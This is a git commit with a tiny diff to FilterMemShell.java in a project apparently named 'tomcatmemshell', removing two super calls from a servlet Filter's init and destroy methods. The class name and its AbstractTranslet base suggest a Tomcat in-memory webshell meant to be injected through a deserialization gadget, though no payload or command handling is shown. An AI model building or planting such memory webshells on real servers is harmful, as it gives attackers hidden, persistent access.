8e08504862e2839e21f72d764788b986819afe3f
Kai <1958304602@qq.com>
2025-03-04 20:03:43 +0800

    去掉Filter init和destroy内的super

--- src/main/java/org/example/tomcatmemshell/Filter/FilterMemShell.java
+++ src/main/java/org/example/tomcatmemshell/Filter/FilterMemShell.java
@@ -133,13 +133,12 @@ public class FilterMemShell extends AbstractTranslet implements Filter {
 
     @Override
     public void init(FilterConfig filterConfig) throws ServletException {
-        Filter.super.init(filterConfig);
+
     }
 
 
     @Override
     public void destroy() {
-        Filter.super.destroy();
     }
 
     @Override
